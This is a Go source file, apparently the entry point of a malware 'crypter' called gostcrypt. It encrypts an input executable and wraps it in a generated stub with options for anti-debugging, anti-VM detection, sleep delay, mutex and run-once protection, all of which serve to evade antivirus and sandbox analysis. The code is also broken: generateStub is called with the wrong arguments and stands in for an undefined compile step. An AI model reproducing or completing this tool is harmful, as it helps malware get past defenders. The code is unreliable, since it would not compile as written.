package main

import (
	"bytes"
	"encoding/base64"
	"flag"
	"fmt"
	"gostcrypt/internal/config"
	gostencrypt "gostcrypt/internal/encryption"
	"io/ioutil"

	"text/template"
)

func main() {
	// Define flags
	inputFile := flag.String("input", "", "Input executable file")
	outputFile := flag.String("output", "output.exe", "Output executable file")
	antiDebug := flag.Bool("anti-debug", false, "Enable anti-debugging features")
	antiVM := flag.Bool("anti-vm", false, "Enable anti-VM detection")
	sleepDelay := flag.Int("sleep", 0, "Add sleep delay (in seconds)")
	customMutex := flag.String("mutex", "", "Custom mutex name")
	runOnce := flag.Bool("run-once", false, "Enable run-once protection")
	flag.Parse()

	if *inputFile == "" {
		fmt.Println("Please specify input file using -input flag")
		return
	}

	// Create config
	cfg := &config.StubConfig{
		AntiDebug:   *antiDebug,
		AntiVM:      *antiVM,
		SleepDelay:  *sleepDelay,
		CustomMutex: *customMutex,
		RunOnce:     *runOnce,
	}

	// Read and encrypt the input file
	data, err := ioutil.ReadFile(*inputFile)
	if err != nil {
		panic(err)
	}

	key := gostencrypt.GenerateKey()
	encrypted := gostencrypt.Encrypt(data, key)

	// Generate stub
	stubCode := generateStub(encrypted, key, cfg)

	// Write and compile stub
	generateStub(stubCode, *outputFile)
}

func generateStub(encrypted []byte, key []byte, cfg *config.StubConfig) string {
	// Read the stub template
	stubTemplate, err := ioutil.ReadFile("internal/stub/stub.tmpl")
	if err != nil {
		panic(err)
	}

	// Parse the template
	tmpl, err := template.New("stub").Parse(string(stubTemplate))
	if err != nil {
		panic(err)
	}

	// Prepare template data
	data := struct {
		EncryptedData string
		Key           string
		Config        *config.StubConfig
	}{
		EncryptedData: base64.StdEncoding.EncodeToString(encrypted),
		Key:           base64.StdEncoding.EncodeToString(key),
		Config:        cfg,
	}

	// Execute template
	var stubCode bytes.Buffer
	if err := tmpl.Execute(&stubCode, data); err != nil {
		panic(err)
	}

	return stubCode.String()
}
